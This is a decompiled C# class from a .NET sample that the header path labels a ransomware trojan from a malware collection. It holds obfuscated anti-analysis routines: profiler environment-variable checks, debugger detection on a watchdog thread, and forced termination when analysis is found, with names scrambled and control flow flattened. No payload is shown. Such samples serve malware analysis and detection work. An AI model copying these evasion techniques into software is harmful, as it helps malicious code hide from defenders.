// Decompiled with JetBrains decompiler
// Type: 紶自㰛㋉ᖹꘀ
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591BD174-6BA7-4AF8-A4DB-5D88FD31BDF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2c01a4b5df598caa723ca49a0e4b85d0a6bc07036550fe1bdc6fe8c7ff4495d2.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

internal static class 紶自㰛\u32C9\uEA58ᖹ\uE826ꘀ
{
  [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern int 杠ׄ짍쭀뢈䝸٘\u33D4(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength,
    out int ReturnLength);

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern uint \uFFFD峛薱忾햌鲔ꗦ龵(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength);

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
  private static extern bool 羻犛\u4DDEꑝ圳壷넊Ⰵ(IntPtr hObject);

  [DllImport("kernel32.dll", EntryPoint = "IsDebuggerPresent")]
  private static extern bool 椣첓\u3209쓙ት䘁嶫ﰲ();

  [DllImport("kernel32.dll", EntryPoint = "OutputDebugString")]
  private static extern int 頫ᆒ\uE903堄篸䜂獗訨(string str);

  public static void ꚹ需\uEBE7욠\uF633쉗俢ߜ()
  {
    int num;
    if (Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == null)
      num = ~~--2;
    else
      goto label_6;
label_2:
    Thread thread;
    while (true)
    {
      switch (num)
      {
        case 1:
          thread = new Thread(new ParameterizedThreadStart(紶自㰛\u32C9\uEA58ᖹ\uE826ꘀ.\uE7D2\u286D訉ꯧ鷴ⵓ\u000E빨));
          thread.IsBackground = true;
          num = ~~3 - 3;
          continue;
        case 2:
          if (Environment.GetEnvironmentVariable("COR_PROFILER") == null)
            goto case 1;
          else
            goto label_6;
        default:
          goto label_3;
      }
    }
label_3:
    thread.Start((object) null);
    return;
label_6:
    Environment.FailFast("Profiler detected");
    num = -(-~7 - 2) + 7;
    goto label_2;
  }

  private static void \uE7D2\u286D訉ꯧ鷴ⵓ\u000E빨(object thread)
  {
    Thread thread1 = thread as Thread;
    int num1 = 9 + -(8 - 3) - (9 - 5);
    while (true)
    {
      int num2;
      do
      {
        int num3;
        do
        {
          int num4;
          do
          {
            Thread thread2;
            do
            {
              switch (num1)
              {
                case 1:
                  goto label_4;
                case 2:
                  goto label_5;
                case 3:
                  goto label_7;
                case 4:
                  goto label_8;
                case 5:
                  goto label_10;
                case 6:
                  goto label_11;
                case 7:
                  goto label_12;
                case 8:
                  goto label_14;
                case 9:
                  goto label_15;
                case 10:
                  goto label_16;
                default:
                  thread2 = thread1;
                  num1 = -(5 + 4) - -14 + (4 + 6) - 8;
                  continue;
              }
            }
            while (thread2 != null);
            num1 = ~-(9 - -(9 - 7));
            continue;
label_4:
            num1 = ~~(-3 - ~8 - -1);
            continue;
label_5:
            num4 = Debugger.IsLogging() ? 1 : 0;
            num1 = 4 + 8 + -8 - 15 - ~8 + 6;
          }
          while (num4 == 0);
          num1 = -(-4 - (7 - 6));
          continue;
label_7:
          Thread.Sleep(1000);
          num1 = -~6 - 6;
          continue;
label_8:
          num3 = thread1.IsAlive ? 1 : 0;
          num1 = --8 - 5;
        }
        while (num3 != 0);
        num1 = -(-6 - 2);
        continue;
label_10:
        Environment.FailFast("Debugger detected (Managed)");
        num1 = 9 - --5;
        continue;
label_11:
        Thread.Sleep(500);
        num1 = 16 - (~3 + (8 + 5));
        continue;
label_12:
        num2 = Debugger.IsAttached ? 1 : 0;
        num1 = ~-10 - 4;
      }
      while (num2 != 0);
      num1 = 6 - (21 - ~~7 + ~9);
      continue;
label_14:
      Environment.FailFast("Loop broken");
      num1 = ~-10 - 6;
      continue;
label_15:
      thread1.IsBackground = true;
      thread1.Start((object) Thread.CurrentThread);
      num1 = ~(7 + 9 - --23);
      continue;
label_16:
      thread1 = new Thread(new ParameterizedThreadStart(紶自㰛\u32C9\uEA58ᖹ\uE826ꘀ.\uE7D2\u286D訉ꯧ鷴ⵓ\u000E빨));
      num1 = ~---10;
    }
  }
}
